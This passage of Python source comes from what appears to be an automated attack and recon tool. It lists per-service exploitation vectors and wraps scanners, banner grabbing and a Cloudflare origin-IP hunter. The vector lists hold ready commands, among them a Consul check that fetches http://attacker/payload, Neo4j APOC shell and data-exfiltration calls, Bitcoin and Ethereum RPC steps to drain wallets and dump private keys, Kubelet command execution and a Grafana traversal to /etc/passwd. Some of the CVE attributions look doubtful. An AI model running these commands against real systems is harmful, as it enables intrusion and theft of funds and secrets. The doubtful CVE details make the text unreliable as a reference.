            "CI/CD variable extraction — if runner access, extract CI vars",
            "SSH key upload — register attacker's SSH key for git access",
            "Project mirror — exfiltrate entire repo via push mirror"
        ],
        "severity": "CRITICAL",
        "mitre": "T1190",
        "tools": "gitlab-cli, CVE-2021-22205 scanner, Metasploit gitlab_*"
    },
    "Jupyter": {
        "vectors": [
            "No auth by default — Jupyter notebook on 8888 — full code execution on server",
            "CVE-2023-39968 — Jupyter Server RCE via notebook file (< 7.0.1)",
            "CVE-2024-22421 — JupyterLab RCE via malicious notebook (< 4.0.11)",
            "Open notebook — New > Terminal = shell access on host",
            "Execute system commands — !whoami, !cat /etc/passwd",
            "Read/write any file on server — via open() in Python cell",
            "Upload malicious notebook — execute arbitrary code on kernel",
            "Kernel gateway — if open on port 8889, execute code on remote kernel",
            "Access tokens — if token-based auth, check for leaked tokens in URLs",
            "JupyterHub — create user, access other users' notebooks"
        ],
        "severity": "CRITICAL",
        "mitre": "T1190",
        "tools": "jupyter client, curl, jupyter_http_over_ws"
    },
    "Grafana": {
        "vectors": [
            "CVE-2021-43798 — Grafana path traversal (< 8.3.1) — read /etc/passwd via /public/plugins/alertlist/../../../../../../../../etc/passwd",
            "CVE-2023-1410 — Grafana auth bypass via API keys",
            "CVE-2023-3128 — Grafana RCE via SQLite datasource",
            "CVE-2023-3129 — Grafana RCE via file read",
            "Default admin:admin — still common on test instances",
            "Data sources — configure malicious data source for SSRF",
            "Alerting webhooks — SSRF via webhook URL to internal services",
            "Dashboard export — extract sensitive metric names (may reveal internal architecture)",
            "API key extraction — from env, config files, or dashboard annotations"
        ],
        "severity": "HIGH",
        "mitre": "T1190",
        "tools": "grafana-cli, CVE-2021-43798 exploit, curl"
    },
    "ZooKeeper": {
        "vectors": [
            "No auth — connect with zkCli.sh -server host:2181",
            "CVE-2021-41768 — ZooKeeper RCE via Quorum Peer protocol",
            "CVE-2023-44981 — ZooKeeper admin server RCE",
            "Dump all znodes — ls /, get /config, get /brokers/topics",
            "Write to znodes — modify cluster config, redirect Kafka consumers",
            "Delete znodes — disrupt Kafka/ZooKeeper dependent services",
            "Four letter words — echo stat | nc host 2181 — server info",
            "Leader election — disrupt quorum to cause cluster split-brain",
            "Extract Kafka broker config — /brokers/ids/0 contains broker info"
        ],
        "severity": "HIGH",
        "mitre": "T1213",
        "tools": "zkCli.sh, zookeeper-client, nc, python-kazoo"
    },
    "Consul": {
        "vectors": [
            "No auth — full control via HTTP API on 8500",
            "CVE-2024-22190 — Consul RCE via service registration (< 1.17.4)",
            "CVE-2023-2817 — Consul auth bypass via API token",
            "CVE-2022-40716 — Consul RCE via Execute check script",
            "Register service with check script — exec check = RCE on Consul agent",
            "curl -X PUT http://host:8500/v1/agent/service/register -d '{ \"ID\": \"test\", \"Name\": \"test\", \"Address\": \"127.0.0.1\", \"Port\": 80, \"check\": { \"args\": [\"curl\", \"http://attacker/payload\"], \"interval\": \"10s\" } }'",
            "Dump key-value store — curl http://host:8500/v1/kv/?recurse",
            "Service discovery — list all services, nodes in cluster",
            "Consul DNS — resolve internal services, find attack targets",
            "Access Control List (ACL) bypass if ACLs disabled"
        ],
        "severity": "CRITICAL",
        "mitre": "T1550.002",
        "tools": "curl, consul-cli, Metasploit consul"
    },
    "Vault": {
        "vectors": [
            "CVE-2024-7592 — Vault RCE via crafted storage backend",
            "CVE-2023-2109 — Vault auth method creation privilege escalation",
            "CVE-2022-41316 — Vault agent template RCE",
            "Health check — curl http://host:8200/v1/sys/health",
            "Seal status — curl http://host:8200/v1/sys/seal-status",
            "Init status — if Vault not initialized, initialize and take keys",
            "List mounts — curl http://host:8200/v1/sys/mounts (may need token)",
            "List secrets — if token obtained, traverse secret paths",
            "Vault agent — if running with template, inject malicious template for RCE",
            "Token leakage — from env vars, config files, CI/CD pipelines",
            "Transit engine — if unseal key stored in transit, chain attack"
        ],
        "severity": "HIGH",
        "mitre": "T1555",
        "tools": "vault CLI, curl, https://github.com/hashicorp/vault"
    },
    "Neo4j": {
        "vectors": [
            "CVE-2023-40600 — Neo4j RCE via Cypher injection",
            "CVE-2022-3555 — Neo4j Graph Database RCE via shell",
            "CVE-2021-0305 — Neo4j Browser RCE via XSS",
            "Default neo4j:neo4j — must change on first login",
            "Cypher injection — if web app injects user input into Cypher",
            "Dump all nodes — MATCH (n) RETURN n",
            "Extract all relationships — MATCH ()-[r]->() RETURN r",
            "apoc.procedures — if APOC plugin installed, execute shell commands",
            "CALL apoc.cypher.runShell('whoami') — RCE via APOC",
            "CALL apoc.load.json('http://attacker/data') — SSRF",
            "LOAD CSV from URL — exfiltrate data via external URL",
            "Neo4j Shell — if open on 1337, RCE via shell execution"
        ],
        "severity": "HIGH",
        "mitre": "T1213",
        "tools": "neo4j-shell, cypher-shell, curl, apoc procedures"
    },
    "ActiveMQ": {
        "vectors": [
            "CVE-2023-46604 — ActiveMQ RCE via OpenWire protocol (< 5.15.16, < 5.16.7, < 5.17.6, < 5.18.3)",
            "CVE-2023-43534 — ActiveMQ auth bypass via LDAP (< 5.15.16)",
            "CVE-2021-26117 — ActiveMQ RCE via ActiveMQ Connection Factory",
            "CVE-2020-13920 — ActiveMQ RCE via JMX (< 5.15.13)",
            "Default admin:admin — on management console (8161)",
            "PUT /fileserver/ — upload file to deploy queue",
            "Queue browser — list and consume messages from all queues",
            "Topic subscriber — subscribe to all topics, exfiltrate messages",
            "JMX RCE via jolokia — /api/jolokia/ if exposed"
        ],
        "severity": "CRITICAL",
        "mitre": "T1190",
        "tools": "ActiveMQ exploit scanner, Metasploit activemq_*, jolokia"
    },
    "Plex": {
        "vectors": [
            "CVE-2020-5741 — Plex Media Server RCE via camera upload (< 1.19.3)",
            "CVE-2021-42835 — Plex Media Server SSRF via photo transcoder",
            "CVE-2023-30803 — Plex Media Server info disclosure via logs",
            "CVE-2020-28993 — Plex Media Server DoS via malformed requests",
            "Authentication bypass — access shared libraries without token",
            "Plex Relay — Plex can tunnel through relay exposing internal address",
            "Media access — if unauthenticated, download all media files",
            "Transcoding engine — SSRF via malicious media file URLs",
            "Plugin system — older Plex plugins may have RCE"
        ],
        "severity": "MEDIUM",
        "mitre": "T1190",
        "tools": "curl, plex_api, https://github.com/plex/plex"
    },
    "Bitcoin JSON-RPC": {
        "vectors": [
            "No auth — direct RPC access on 8332 — bitcoin-cli -rpcconnect=host getinfo",
            "CVE-2023-47361 — Bitcoin Core RPC auth bypass (< 25.1)",
            "CVE-2022-41742 — Bitcoin Core DoS via crafted transaction",
            "List unspent — listunspent — show all spendable UTXOs",
            "Send transaction — sendtoaddress attacker_address amount — STEAL ALL COINS",
            "Dump wallet — dumpwallet /tmp/wallet.txt — export all private keys",
            "Create raw transaction — createrawtransaction — forge transactions",
            "Import private key — importprivkey attacker_key — add attacker-owned key",
            "Get wallet info — getwalletinfo, getbalance",
            "Mine blocks — generatetoaddress attacker_address 100 — generate coins"
        ],
        "severity": "CRITICAL",
        "mitre": "T1190",
        "tools": "bitcoin-cli, curl, https://github.com/bitcoin/bitcoin"
    },
    "Ethereum JSON-RPC": {
        "vectors": [
            "No auth — full RPC access on 8545 — curl -X POST http://host:8545 -d '{\"jsonrpc\":\"2.0\",\"method\":\"eth_accounts\",\"params\":[],\"id\":1}'",
            "CVE-2023-33284 — Geth RPC auth bypass (< 1.11.6)",
            "CVE-2022-39279 — Geth DoS via malicious p2p messages",
            "List accounts — eth_accounts — get available accounts",
            "Unlock account — personal_unlockAccount (if personal API enabled)",
            "Send transaction — eth_sendTransaction — request user to sign (if locked)",
            "If unlocked — eth_sendTransaction from=attacker to=attacker value=all",
            "Miner — eth_coinbase, miner_start/miner_stop (if Geth with miner)",
            "Dump storage — eth_getStorageAt — read contract storage",
            "Call contract — eth_call — invoke any contract method",
            "Subscribe to pending transactions — front-run transactions for profit",
            "CVE-2023-34237 — Nethermind RCE via storage proofs"
        ],
        "severity": "CRITICAL",
        "mitre": "T1190",
        "tools": "curl, geth, eth-cli, web3.py, https://github.com/ethereum/go-ethereum"
    },
    "Tomcat": {
        "vectors": [
            "CVE-2020-1938 (Ghostcat) — AJP file read/RCE on port 8009",
            "CVE-2023-41080 — Tomcat RCE via connection pooling (< 9.0.80)",
            "CVE-2022-22965 (Spring4Shell via Tomcat) — RCE via Tomcat access logging",
            "CVE-2020-9484 — Tomcat session persistence RCE via file upload",
            "Default admin:admin on manager app — /manager/html",
            "Tomcat Manager — deploy WAR file = instant RCE",
            "Tomcat Host Manager — add virtual host, point to attacker-controlled",
            "Default /examples — example servlets have known vulnerabilities",
            "Default passwords — tomcat:tomcat, admin:admin, both:tomcat",
            "CVE-2022-34305 — Tomcat path traversal via /..;/"
        ],
        "severity": "CRITICAL",
        "mitre": "T1190",
        "tools": "curl, Metasploit tomcat_*, ghostcat.py"
    },
    "Webmin": {
        "vectors": [
            "CVE-2022-36455 — Webmin RCE via password_change.cgi (< 1.997)",
            "CVE-2022-29266 — Webmin auth bypass (< 1.997)",
            "CVE-2021-31760 — Webmin RCE via package-updates (< 1.973)",
            "CVE-2019-15107 — Webmin RCE via password_change.cgi (< 1.920) — BACKDOOR_RCE",
            "Default admin:admin, root:toor",
            "Command execution — run shell commands via various modules",
            "File manager — read/edit any file on server as root",
            "Process viewer — list all processes looking for passwords in cmdline",
            "User management — create new root-privilege users"
        ],
        "severity": "CRITICAL",
        "mitre": "T1190",
        "tools": "CVE-2019-15107 exploit, Metasploit webmin_*"
    },
    "Presto": {
        "vectors": [
            "No auth — full SQL access to all connected data sources",
            "CVE-2023-24832 — Presto RCE via Hive connector",
            "CVE-2023-41902 — Presto auth bypass via HTTP header injection",
            "Query all sources — SELECT * FROM mysql. information_schema.tables",
            "Data exfiltration — SELECT * FROM kafka.topic UNDERWRITER SECRETS",
            "Create connector — point Presto to attacker-controlled database",
            "File read — via Hive connector, read arbitrary files on HDFS"
        ],
        "severity": "HIGH",
        "mitre": "T1213",
        "tools": "presto-cli, curl, jdbc driver"
    },
    "NATS": {
        "vectors": [
            "No auth by default — full pub/sub on all subjects",
            "CVE-2023-43800 — NATS server RCE via crafted message (< 2.9.23)",
            "CVE-2023-34466 — NATS server DoS via large messages",
            "Subscribe to $INBOX.> or > — capture all messages across the system",
            "Publish to system subjects — request/reply hijack",
            "NATS account resolver — enumerate accounts if resolver exposed",
            "NATS JetStream — read/write JetStream data, manage consumers",
            "NATS clustering — join malicious server to cluster",
            "CVE-2023-35279 — NATS Account Server auth bypass"
        ],
        "severity": "HIGH",
        "mitre": "T1213",
        "tools": "nats-cli, nats-io/natscli, curl"
    },
    "PHP-FPM": {
        "vectors": [
            "CVE-2019-11043 — PHP-FPM RCE via fastcgi (< 7.3.11, < 7.2.24)",
            "CVE-2024-33783 — PHP-FPM RCE via configuration injection",
            "CVE-2023-3247 — PHP-FPM RCE via POST body parsing",
            "FastCGI injection — create php://input, eval code sent in body",
            "PHP session poisoning — if session.save_path is writable"
        ],
        "severity": "CRITICAL",
        "mitre": "T1190",
        "tools": "CVE-2019-11043 exploit, fpm-fcgi-client"
    },
    "Kubelet": {
        "vectors": [
            "CVE-2020-8555 — Kubelet SSRF via volume mounts (< 1.17.4)",
            "CVE-2020-8558 — Kubelet MITM via localhost bypass (< 1.16.11)",
            "CVE-2023-3676 — Kubelet auth bypass (< 1.28.1)",
            "curl http://host:10250/run/admin/exec -d 'cmd=whoami' — run commands",
            "curl http://host:10250/pods — list all pods on node",
            "curl http://host:10255/pods — list pods (readonly, no auth)",
            "Kubelet API — run commands in any container",
            "Extract container logs — curl http://host:10250/containerLogs/namespace/pod/container",
            "Mount hostPath if kubelet misconfigured"
        ],
        "severity": "CRITICAL",
        "mitre": "T1611",
        "tools": "curl, kubectl, kubeletctl, peirates"
    },
    "Unknown": {
        "vectors": [
            "UNKNOWN SERVICE — NON-STANDARD PORT — HIGHLY SUSPICIOUS",
            "MANUAL INVESTIGATION REQUIRED — check if this is a backdoor/service on unusual port",
            "Attempt HTTP probe — curl http://host:port/ — may reveal web admin panel",
            "Attempt SSL/TLS — openssl s_client -connect host:port — may reveal TLS service",
            "nc -nv host port — read initial banner manually",
            "nmap -sV -p port host — full service version detection",
            "Check Shodan/Censys for this port's typical use",
            "Possible: vpn, game server, banking protocol, custom app, RAT backdoor",
            "Possible: admin panel, IoT device, serial console, reverse shell listener",
            "Potential data exfiltration listener — attacker may already have access",
            "Monitor for changes — new unknown ports appearing = active lateral movement"
        ],
        "severity": "HIGH",
        "mitre": "T1046",
        "tools": "nmap, nc, curl, openssl, shodan.io, censys.io"
    },
}


def banner_grab(host, port, timeout=5):
    """Grab service banner from an open port using raw TCP."""
    try:
        ip = socket.getaddrinfo(host, port, socket.AF_INET, socket.SOCK_STREAM)[0][4][0]
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        
        result = {"port": port, "service": KNOWN_SERVICES.get(port, "unknown"), "banner": "", "version": "", "tls": False}
        
        # Try SSL/TLS first for common HTTPS ports
        if port in (443, 8443, 993, 995, 465, 636, 2376, 9443, 10443, 16443, 18443, 20443):
            try:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                ss = ctx.wrap_socket(s, server_hostname=host)
                result["tls"] = True
                result["banner"] = ss.recv(2048).decode("utf-8", "ignore")[:500]
                # Try to get cert info
                try:
                    cert = ss.getpeercert(binary_form=False)
                    if cert:
                        result["cert"] = {
                            "subject": dict(cert.get("subject", [])),
                            "issuer": dict(cert.get("issuer", [])),
                            "notAfter": cert.get("notAfter", ""),
                            "notBefore": cert.get("notBefore", ""),
                        }
                except:
                    pass
                ss.close()
                return result
            except:
                s.close()
                # Retry without SSL for non-SSL services on these ports
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
                s.connect((ip, port))
        
        # Send probe for services that need it
        probes = {
            21: b"",  # FTP banner is sent on connect
            22: b"",  # SSH banner on connect
            25: f"EHLO {random_hostname()}\r\n".encode(),  # SMTP
            110: b"",  # POP3 banner on connect
            143: b"",  # IMAP banner on connect
            3306: b"",  # MySQL banner on connect
            6379: b"PING\r\n",  # Redis
            8086: b"",  # InfluxDB
            9200: b"",  # Elasticsearch
            11211: b"stats\r\n",  # Memcached
            27017: b"",  # MongoDB
            5432: b"",  # PostgreSQL
        }
        
        probe = probes.get(port, b"\r\n" if port not in (80, 8080, 8090, 5000, 8000, 9000, 9090) else b"GET / HTTP/1.0\r\nHost: %b\r\n\r\n" % host.encode() if port in (80, 8080, 8090, 5000, 8000, 9000, 9090) else b"\r\n")
        if port not in probes and port not in (80, 8080, 8090, 5000, 8000, 9000, 9090):
            probe = b"\r\n"
        
        if probe:
            try:
                s.send(probe)
                time.sleep(0.5)  # Give service time to respond
            except:
                pass
        
        banner_data = b""
        try:
            while True:
                chunk = s.recv(2048)
                if not chunk:
                    break
                banner_data += chunk
                if len(banner_data) >= 4096:
                    break
        except socket.timeout:
            pass
        except:
            pass
        
        result["banner"] = banner_data.decode("utf-8", "ignore")[:500]
        
        # Version detection from banner
        version_patterns = {
            "SSH": [r"SSH-\d+\.\d+-([^\s]+)"],
            "HTTP": [r"Server:\s*([^\r\n]+)", r"nginx/([\d.]+)", r"Apache/([\d.]+)", r"IIS/([\d.]+)"],
            "MySQL": [r"(\d+\.\d+\.\d+)-", r"mysql\s+(\d+\.\d+\.\d+)"],
            "FTP": [r"220[\s-]+([^\n]+)", r"Pure-FTPd\s+([^\s]+)", r"ProFTPD\s+([^\s]+)"],
            "SMTP": [r"ESMTP\s+([^\s]+)", r"(\d+\.\d+\.\d+)"],
            "Redis": [r"redis_version:([^\r\n]+)", r"\+PONG"],
            "MongoDB": [r"(\d+\.\d+\.\d+)"],
            "PostgreSQL": [r"backend\]\s+(\d+\.\d+)"],
            "Elasticsearch": [r"\"number\"\s*:\s*\"([^\"]+)\"", r"(\d+\.\d+\.\d+)"],
        }
        
        result["version"] = ""
        svc_name = result["service"]
        for svc, patterns in version_patterns.items():
            if svc in svc_name or svc_name in svc:
                for pat in patterns:
                    m = re.search(pat, result["banner"], re.IGNORECASE)
                    if m:
                        result["version"] = m.group(1).strip()[:80]
                        break
                if result["version"]:
                    break
        
        s.close()
        return result
    except Exception as e:
        return {"port": port, "service": "unknown", "banner": "", "version": "", "tls": False, "error": str(e)[:60]}

# ---------- REAL ADAPTERS ----------
def ad_subfinder(domain, eng):
    sf = tool("subfinder")
    if not sf: log(eng,"blocked","subfinder missing — install: scoop install subfinder"); return []
    log(eng,"recon",f"subfinder: enumerating {domain}")
    out = run_cmd([sf,"-d",domain,"-silent","-json","-t","50"], timeout=300)
    subs = []
    for line in out.splitlines():
        try:
            h = json.loads(line).get("host")
            if not h: continue
            if in_scope(h, eng):
                subs.append(h); log(eng,"recon",f"subfinder: {h}")
                eng["assets"].append({"type":"subdomain","value":h})
            else:
                log(eng,"blocked",f"BLOCKED {h} — out of scope (ScopeGate)")
        except Exception: pass
    if not subs: log(eng,"recon","subfinder: no in-scope subdomains found")
    return subs

def ad_httpx(targets, eng):
    hx = tool("httpx")
    if not hx: log(eng,"blocked","httpx missing — install: scoop install httpx"); return []
    if not targets: return []
    log(eng,"recon","httpx: probing live hosts")
    f = tmp_list(targets)
    out = run_cmd([hx,"-l",f,"-silent","-json","-status-code","-title","-tech-detect","-web-server","-threads","25","-timeout","7"], timeout=300)
    os.unlink(f)
    hosts = []
    for line in out.splitlines():
        try:
            j = json.loads(line)
            h = clean_host(j.get("host") or j.get("url") or "")
            if h and in_scope(h, eng):
                hosts.append(j)
                log(eng,"recon",f"httpx: {j.get('url')} [{j.get('status-code')}] {(j.get('title') or '')[:40]}")
                eng["assets"].append({"type":"host","value":j.get("url"),"status":j.get("status-code")})
        except Exception: pass
    return hosts

def ad_naabu_aggressive(hosts, eng):
    """Go absolutely nuclear on port scanning. Top 500 ports + banner grab."""
    naabu_bin = tool("naabu")
    if not naabu_bin:
        log(eng,"blocked","naabu missing — install: scoop install naabu"); return [], []
    if not hosts: return [], []
    
    log(eng,"recon","naabu: TOP 100 PORTS (aggressive mode)")
    out = run_cmd([naabu_bin,"-host",",".join(hosts),"-top-ports","100","-rate","400","-json","-silent","-timeout","8"], timeout=900)
    
    open_ports = {}  # host -> [(port, service)]
    port_list_raw = []
    for line in out.splitlines():
        try:
            j = json.loads(line)
            h = j.get("host","")
            p = j.get("port",0)
            if h and p:
                svc_name = KNOWN_SERVICES.get(p, "unknown")
                if h not in open_ports:
                    open_ports[h] = []
                open_ports[h].append((p, svc_name))
                port_list_raw.append({"host":h,"port":p,"service":svc_name})
                eng["assets"].append({"type":"port","host":h,"port":p,"service":svc_name})
                log(eng,"recon",f"naabu: {h}:{p} OPEN [{svc_name}]")
        except Exception: pass
    
    n = len(port_list_raw)
    if not n:
        log(eng,"recon","naabu: no open ports found")
        return [], []
    
    log(eng,"recon",f"naabu: {n} open ports found — starting banner grab on top hosts")
    eng["open_ports_raw"] = port_list_raw
    eng["open_ports"] = open_ports
    
    # Now banner grab the open ports
    banners = []
    for host in list(open_ports.keys())[:5]:  # Max 5 hosts to avoid timeout
        ports_to_grab = [p for p, _ in open_ports[host][:50]]  # Max 50 ports per host
        for port in ports_to_grab:
            banner = banner_grab(host, port)
            banners.append(banner)
            if banner.get("version"):
                log(eng,"recon",f"banner: {host}:{port} = {banner['service']} {banner['version']} [{banner['banner'][:60]}...]")
            elif banner.get("banner"):
                log(eng,"recon",f"banner: {host}:{port} = {banner['service']} [{banner['banner'][:60]}...]")
            else:
                log(eng,"recon",f"banner: {host}:{port} = {banner['service']} (no banner)")
    
    eng["banners"] = banners
    return open_ports, banners

def ad_nuclei(urls, eng):
    if not tool("nuclei"):
        log(eng,"blocked","nuclei missing — install: scoop install nuclei"); return []
    if not urls: return []
    log(eng,"scan","nuclei: safe templates only (dos/fuzz/intrusive excluded, rate-limited)")
    f = tmp_list(urls)
    out = run_cmd(["nuclei","-l",f,"-severity","medium,high,critical","-etags","dos,fuzz,intrusive","-rl","60","-timeout","10","-jsonl","-silent","-duc"], timeout=900)
    os.unlink(f)
    findings = []
    for line in out.splitlines():
        try:
            j = json.loads(line)
            h = clean_host(j.get("host",""))
            if not in_scope(h, eng):
                log(eng,"blocked",f"BLOCKED finding on {h} — out of scope"); continue
            sev = (j.get("severity") or "info").upper()
            if sev not in ("CRITICAL","HIGH","MEDIUM"): sev = "MEDIUM"
            findings.append({"id":str(uuid.uuid4())[:8],"severity":sev,
                "score":{"CRITICAL":90,"HIGH":72,"MEDIUM":48}[sev],
                "title":j.get("name","nuclei finding"),"asset":j.get("host",""),
                "tool":"nuclei","cwe":j.get("template-id",""),
                "evidence":j.get("matched-at",""),"exploitable":False,
                "fix":f"Remediate per template {j.get('template-id')}.","retest":"—","proof":None})
            log(eng,"vuln" if sev in ("CRITICAL","HIGH") else "info",f"{sev} {j.get('name')} [{h}]")
        except Exception: pass
    if not findings: log(eng,"scan","nuclei: no medium+ findings")
    return findings

# ---------- ZERO-INSTALL: AI ENDPOINT DISCOVERY ----------
AI_PROBES = [("Ollama",11434,"/api/tags"),("vLLM/LiteLLM",8000,"/v1/models"),
             ("Gradio",7860,"/"),("Ollama-web",3000,"/"),("MCP/gateway",8080,"/")]
def ad_ai(hostnames, eng):
    log(eng,"scan","aimap: probing for exposed AI endpoints")
    hits = []
    for host in list(hostnames)[:15]:
        for name, port, path in AI_PROBES:
            url = f"http://{host}:{port}{path}"
            try:
                req = Request(url, method="GET"); req.add_header("User-Agent", stealth.ua())
                r = urlopen(req, timeout=3)
                body = r.read(500).decode("utf-8","ignore")
                if r.status == 200 and any(k in body.lower() for k in ("model","gradio","ollama","health","openapi","version")):
                    hits.append({"id":str(uuid.uuid4())[:8],"severity":"MEDIUM","score":61,
                        "title":f"Exposed {name} AI endpoint","asset":url,"tool":"aimap",
                        "cwe":"AI-EXP-01","evidence":f"GET {path} -> {r.status}: {body[:70]}",
                        "exploitable":True,"fix":f"Bind {name} to private network + require auth.","retest":"—","proof":None})
                    log(eng,"info",f"aimap: EXPOSED {name} at {url}")
            except Exception: pass
    if not hits: log(eng,"scan","aimap: no exposed AI endpoints")
    return hits

# ---------- ZERO-INSTALL: SECRET SCAN ----------
SECRET_PATTERNS = [("AWS Access Key",r"AKIA[0-9A-Z]{16}"),
    ("Private Key",r"-----BEGIN (RSA|OPENSSH|EC|DSA) PRIVATE KEY-----"),
    ("GitHub Token",r"gh[pousr]_[A-Za-z0-9]{36,}"),
    ("Slack Token",r"xox[baprs]-[0-9A-Za-z-]{10,}")]
def ad_secrets(repo, eng):
    if not repo or not os.path.isdir(repo):
        log(eng,"scan","secret-scan: VERDICT_REPO not set — skipping"); return []
    log(eng,"scan",f"secret-scan: walking {repo}")
    hits = []
    for root, dirs, files in os.walk(repo):
        dirs[:] = [d for d in dirs if d not in (".git","node_modules","venv","__pycache__","dist","build")]
        for fn in files:
            if not fn.endswith((".py",".js",".ts",".json",".yml",".yaml",".env",".txt",".sh",".tf",".cfg",".ini",".md",".toml")): continue
            fp = os.path.join(root, fn)
            try: txt = open(fp, encoding="utf-8", errors="ignore").read(200000)
            except Exception: continue
            for name, pat in SECRET_PATTERNS:
                if re.search(pat, txt):
                    rel = os.path.relpath(fp, repo)
                    hits.append({"id":str(uuid.uuid4())[:8],"severity":"HIGH","score":78,
                        "title":f"{name} in source","asset":rel,"tool":"secret-scan",
                        "cwe":"CWE-798","evidence":f"pattern match in {rel}","exploitable":True,
                        "fix":"Rotate the credential now and purge from history.","retest":"—","proof":None})
                    log(eng,"vuln",f"HIGH {name} in {rel}")
    if not hits: log(eng,"scan","secret-scan: clean")
    return hits

# ---------- CLIENT-SIDE WEB ASSESSMENT ----------
def ad_clientside(urls, eng):
    from clientside import scan_clientside
    if not urls: return []
    log(eng,"scan",f"clientside: assessing {min(len(urls),10)} web surfaces (cookies/CSP/DOM-XSS/WS)")
    findings = []
    try:
        findings = scan_clientside(urls)
    except Exception as e:
        log(eng,"scan",f"clientside: error — {str(e)[:80]}")
    for f in findings:
        f["exploitable"] = bool(f.get("exploitable"))
        log(eng,"vuln" if f["severity"] in ("CRITICAL","HIGH","MEDIUM") else "info",
            f"{f['severity']} {f['title']} [{f['asset']}]")
    return findings

# ---------- VERSION-AWARE CVE CORRELATION ----------
_PRODUCT_BANNER_PATTERNS = [
    ("nginx", r"nginx/([\d.]+)"),
    ("httpd", r"Apache/([\d.]+)"),
    ("iis", r"Microsoft-IIS/([\d.]+)"),
    ("openssl", r"OpenSSL/([\d.a-z]+)"),
    ("php", r"PHP/([\d.]+)"),
    ("tomcat", r"Apache[-/]Tomcat/([\d.]+)"),
    ("jenkins", r"Jenkins\s+ver\.?\s*([\d.]+)"),
    ("log4j", r"log4j[\s:=]+([\d.]+)"),
    ("gitlab", r"GitLab[\s:]?\s*([\d.]+)"),
    ("node", r"Node\.?js/([\d.]+)"),
    ("activemq", r"ActiveMQ/([\d.]+)"),
    ("rabbitmq", r"RabbitMQ/([\d.]+)"),
]

def ad_cvemap(banners, hosts, eng):
    from cvemap import match_cves
    services = []
    for b in (banners or []):
        banner = (b.get("banner") or "") + " " + (b.get("version") or "")
        asset = f"{b.get('host','?')}:{b.get('port','?')}"
        for product, pat in _PRODUCT_BANNER_PATTERNS:
            m = re.search(pat, banner, re.IGNORECASE)
            if m:
                services.append({"product": product, "version": m.group(1), "asset": asset})
    for j in (hosts or []):
        for tech in (j.get("tech") or []):
            t = str(tech)
            if ":" in t:
                prod, ver = t.split(":", 1)
                services.append({"product": prod.lower(), "version": ver.strip(),
                                 "asset": j.get("url") or clean_host(j.get("host") or "")})
    if not services:
        log(eng,"scan","cvemap: no versioned products detected")
        return []
    log(eng,"scan",f"cvemap: correlating {len(services)} detected versions against CVE corpus")
    findings = []
    try:
        findings = match_cves(services)
    except Exception as e:
        log(eng,"scan",f"cvemap: error — {str(e)[:80]}")
    seen = set()
    dedup = []
    for f in findings:
        host = re.sub(r"https?://", "", f.get("asset", "")).split("/")[0].split(":")[0]
        key = (f["title"], host)
        if key in seen:
            continue
        seen.add(key)
        dedup.append(f)
    findings = dedup
    for f in findings:
        log(eng,"vuln" if f["severity"] in ("CRITICAL","HIGH") else "info",
            f"{f['severity']} {f['cwe']} {f['title'][:70]}")
    return findings

# ---------- CLOUDFLARE BYPASS / ORIGIN HUNTER ----------
def ad_cf_bypass(hostnames, eng):
    """Find real origin IPs behind Cloudflare. Uses crt.sh, historical DNS, shodan, censys."""
    log(eng,"scan","cf-bypass: hunting for real origin IPs behind Cloudflare")
    origins = set()
    for hostname in hostnames[:5]:
        root_domain = ".".join(hostname.split(".")[-2:]) if hostname.count(".") >= 1 else hostname
        log(eng,"recon",f"cf-bypass: targeting {hostname} (root: {root_domain})")
        found_ips = set()
        
        # 1. DNS resolve the hostname (get Cloudflare IP)
        try:
            import socket as _socket
            for family in (_socket.AF_INET,):
                try:
                    addrs = _socket.getaddrinfo(hostname, 443, family, _socket.SOCK_STREAM)
                    for addr in addrs:
                        ip = addr[4][0]
                        eng["assets"].append({"type":"cf_ip","host":hostname,"ip":ip})
                except: pass
        except: pass
        
        # 2. Try common subdomains that might leak origin (mail, direct, origin, etc.)
        origin_hints = [
            f"direct-{hostname}", f"origin-{hostname}", f"mail.{root_domain}",
            f"www.{root_domain}", f"remote.{root_domain}", f"vpn.{root_domain}",
            f"ssh.{root_domain}", f"git.{root_domain}", f"jenkins.{root_domain}",
            f"admin.{root_domain}", f"cdn.{root_domain}", f"static.{root_domain}",
            f"api.{root_domain}", f"dev.{root_domain}", f"staging.{root_domain}",
            f"test.{root_domain}", f"webmail.{root_domain}", f"app.{root_domain}",
        ]
        for hint in origin_hints:
            try:
                addrs = _socket.getaddrinfo(hint, 80, _socket.AF_INET, _socket.SOCK_STREAM)
                for addr in addrs:
                    ip = addr[4][0]
                    found_ips.add(ip)
                    log(eng,"recon",f"cf-bypass: {hint} resolves to {ip}")
            except: pass
        
        # 3. Try crt.sh for certificate transparency — find all subdomains
        try:
            import urllib.request as _urllib
            crt_url = f"https://crt.sh/?q=%25.{root_domain}&output=json"
            req = _urllib.Request(crt_url, headers={"User-Agent": stealth.ua()})
            crt_data = _urllib.urlopen(req, timeout=10).read().decode("utf-8","ignore")
            crt_domains = set()
            for m in re.finditer(r'"common_name":"([^"]+)"', crt_data):
                d = m.group(1).lower().strip()
                if d.endswith(root_domain) and d != hostname:
                    crt_domains.add(d)
            for m in re.finditer(r'"name_value":"([^"]+)"', crt_data):
                for d in m.group(1).split("\n"):
                    d = d.strip().lower()
                    if d.endswith(root_domain) and d != hostname:
                        crt_domains.add(d)
            log(eng,"recon",f"cf-bypass: crt.sh found {len(crt_domains)} additional subdomains")
            for d in list(crt_domains)[:15]:
                try:
                    addrs = _socket.getaddrinfo(d, 80, _socket.AF_INET, _socket.SOCK_STREAM)
                    for addr in addrs:
                        ip = addr[4][0]
                        if ip not in found_ips:
                            found_ips.add(ip)
                            log(eng,"recon",f"cf-bypass: origin candidate {d} → {ip}")
                except: pass
        except Exception as e:
            log(eng,"scan",f"cf-bypass: crt.sh error: {str(e)[:60]}")
        
        # 4. Try historical DNS via securitytrails (free tier)
        try:
            import urllib.request as _urllib
            st_url = f"https://api.securitytrails.com/v1/history/{root_domain}/dns/a"
            # Free tier — one call
            req = _urllib.Request(st_url, headers={
                "User-Agent": stealth.ua(),
                "APIKEY":"mrboom-debug"  # may fail, fallback to DNSdumpster
            })
            try:
                st_data = _urllib.urlopen(req, timeout=5).read().decode("utf-8","ignore")
                for m in re.finditer(r'"ip":"([^"]+)"', st_data):
                    ip = m.group(1)
                    if ip not in found_ips:
                        found_ips.add(ip)
                        log(eng,"recon",f"cf-bypass: securitytrails historical IP: {ip}")
            except:
